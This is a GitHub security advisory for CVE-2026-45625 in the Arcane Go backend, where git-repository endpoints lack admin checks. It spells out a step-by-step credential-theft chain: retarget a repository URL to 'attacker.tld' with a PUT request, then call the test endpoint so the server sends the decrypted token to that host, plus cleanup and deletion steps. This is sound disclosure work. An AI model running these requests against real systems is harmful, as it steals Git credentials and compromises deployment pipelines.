# [C] Arcane Backend: Missing admin authorization on git repository endpoints allows non-admin users to exfiltrate stored Git credentials and tamper with GitOps configs

## Summary
Severity: Critical
Advisory: GHSA-7h26-hg47-p9hx
CVE: CVE-2026-45625
CWE: CWE-862
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-18
Source: https://github.com/advisories/GHSA-7h26-hg47-p9hx
Type: github-advisory

## Affected
- Go: `github.com/getarcaneapp/arcane/backend` — affected >=0 <1.19.0

## Details
## Summary

Arcane's huma-based REST API exposes nine endpoints under `/api/customize/git-repositories` and `/api/git-repositories/sync` for managing GitOps source repositories and their stored credentials. Eight of those endpoints (`list`, `create`, `get`, `update`, `delete`, `test`, `listBranches`, `browseFiles`) never call the `checkAdmin(ctx)` helper that every other admin-managed resource (container registries, environments, users, API keys, swarm, settings, system, notifications, events) uses, and the huma authentication middleware deliberately enforces only authentication, not the `admin` role. As a result, any logged-in user with the default `user` role can list, create, modify, delete, and test git repository configurations. By repointing an existing repository's URL to an attacker-controlled host while omitting the `token`/`sshKey` fields (which `UpdateRepository` only rewrites when explicitly supplied), the attacker causes Arcane to decrypt the legitimate PAT/SSH key on its next `/test`, `/branches`, or `/files` call and present it as HTTP Basic auth (or SSH key auth) to the attacker's host — producing a one-step exfiltration of plaintext Git credentials.

## Details

### Auth bridge does not enforce role

`backend/internal/huma/middleware/auth.go:192-254` (`NewAuthBridge`) validates Bearer JWTs / API keys / agent tokens and stores the user (and an `userIsAdmin` flag) in the request context, but it never rejects non-admin callers — admin enforcement is intentionally delegated to handlers via `helpers.checkAdmin`:

```go
// backend/internal/huma/handlers/helpers.go:11-12
// checkAdmin checks if the current user is an admin and returns a 403 error if not.
func checkAdmin(ctx context.Context) error { ... }
```

`grep -rn "checkAdmin"` confirms every other admin resource uses it (container_registries, environments, users, apikeys, events, settings, swarm, system, notifications). Default new accounts get role `"user"` (`backend/internal/huma/handlers/users.go:222-223`):

```go
if userModel.Roles == nil {
    userModel.Roles = []string{"user"}
}
```

### Git repository handler is missing the admin gate on 8 of 9 endpoints

`backend/internal/huma/handlers/git_repositories.go:117-236` registers nine endpoints. Only `SyncRepositories` (line 456) calls `checkAdmin(ctx)`. The other handlers — `ListRepositories` (line 243), `CreateRepository` (271), `GetRepository` (301), `UpdateRepository` (326), `DeleteRepository` (356), `TestRepository` (382), `ListBranches` (407), `BrowseFiles` (428) — perform no role check whatsoever:

```go
// backend/internal/huma/handlers/git_repositories.go:326-336
func (h *GitRepositoryHandler) UpdateRepository(ctx context.Context, input *UpdateGitRepositoryInput) (*UpdateGitRepositoryOutput, error) {
    if h.repoService == nil {
        return nil, huma.Error500InternalServerError("service not available")
    }
    actor := models.User{}
    if currentUser, exists := humamw.GetCurrentUserFromContext(ctx); exists && currentUser != nil {
        actor = *currentUser
    }
    repo, err := h.repoService.UpdateRepository(ctx, input.ID, input.Body, actor)
    ...
```

The service layer (`backend/internal/services/git_repository_service.go`) has no role enforcement either — `grep -n "admin" backend/internal/services/git_repository_service.go` returns nothing.

### Credential-preserving update primitive

`UpdateRepository` builds a partial update map: the `token`/`ssh_key` columns are only rewritten if the corresponding pointer in the request body is non-nil, while the URL is updated unconditionally when `req.URL != nil`:

```go
// backend/internal/services/git_repository_service.go:185-219
updates := make(map[string]any)
if req.Name != nil      { updates["name"] = *req.Name }
if req.URL != nil       { updates["url"]  = *req.URL }   // <-- attacker-pivotable
if req.AuthType != nil  { updates["auth_type"] = *req.AuthType }
...
if req.Token != nil {                                      // <-- only rewritten if supplied
    if *req.Token == "" { updates["token"] = "" } else {
        encrypted, err := crypto.Encrypt(*req.Token)
        ...
        updates["token"] = encrypted
    }
}
```

So `PUT /customize/git-repositories/{id}` with body `{"url":"https://attacker.tld/repo.git"}` retargets the repository while preserving the encrypted token.

### Sink: Basic-auth send to attacker URL

`TestConnection` and `ListBranches`/`BrowseFiles` decrypt the stored token via `GetAuthConfig` and pass the chosen URL + auth to `gitutil`:

```go
// backend/internal/services/git_repository_service.go:340-363
func (s *GitRepositoryService) GetAuthConfig(ctx context.Context, repository *models.GitRepository) (git.AuthConfig, error) {
    authConfig := git.AuthConfig{
        AuthType: repository.AuthType, Username: repository.Username, ...
    }
    if repository.Token != "" {
        token, err := crypto.Decrypt(repository.Token)
        ...
        authConfig.Token = token
    }
    ...
}
```

```go
// backend/pkg/gitutil/git.go:60-69
case "http":
    if config.Token != "" {
        return &githttp.BasicAuth{
            Username: config.Username,
            Password: config.Token,
        }, nil
    }
```

`go-git`'s HTTP transport sends `Authorization: Basic base64(username:token)` in the very first reference-discovery request to the (attacker-controlled) URL — so the cleartext PAT lands in the attacker's web-server access log on the first call to `/test`, `/branches`, or `/files`.

### Full attack chain (HTTP-token variant)

1. Attacker authenticates as a normal `user` (registration or any pre-existing low-priv account).
2. `GET /api/customize/git-repositories` enumerates all configured repositories (id, url, authType, username — token/sshKey are encrypted but their *existence* is visible).
3. `PUT /api/customize/git-repositories/{id}` with `{"url":"https://attacker.tld/repo.git"}` retargets the repo while preserving the encrypted PAT.
4. `POST /api/customize/git-repositories/{id}/test` (or `GET .../branches`) makes Arcane decrypt the PAT and send it to `attacker.tld` as HTTP Basic auth.
5. Optional cleanup: `PUT` again to restore the original URL, leaving no obvious config drift; or `DELETE` every repo for DoS on the GitOps pipeline.

The same primitive works for `authType: "ssh"` repos by retargeting to an attacker-controlled SSH endpoint that logs the offered key (or, with the default `accept_new` host-key mode, by the attacker simply observing the SSH session).

## Impact

- **Cleartext exfiltration of stored Git credentials.** PATs and SSH keys configured by administrators for source-of-truth GitOps repositories are encrypted at rest with a key Arcane controls, but any authenticated low-priv user can cause the application to decrypt them and transmit them to an attacker-chosen URL. Stolen GitHub/GitLab PATs typically grant write access to the org's source repos, CI secrets, container registries, and downstream production systems — escaping Arcane's security boundary entirely (S:C).
- **Privilege escalation to effective Arcane admin over GitOps.** Non-admin users can create, modify, and delete every git repository configuration, controlling what code Arcane pulls and deploys.
- **Supply-chain integrity loss.** A user can swap the URL of an enabled repo to a malicious fork, then revert it after a sync, to inject attacker-controlled images/manifests into deployments.
- **Denial of service on the GitOps pipeline.** `DELETE /customize/git-repositories/{id}` lets any user wipe production repository configurations.
- **Information disclosure of private repo contents.** `GET .../files` clones private repos using stored credentials and returns file contents in the API response, regardless of caller role.

Default Arcane installations create new accounts with role `user`; no special configuration is required for the attack to be reachable.

## References
- https://github.com/getarcaneapp/arcane/security/advisories/GHSA-7h26-hg47-p9hx
- https://nvd.nist.gov/vuln/detail/CVE-2026-45625
- https://github.com/getarcaneapp/arcane
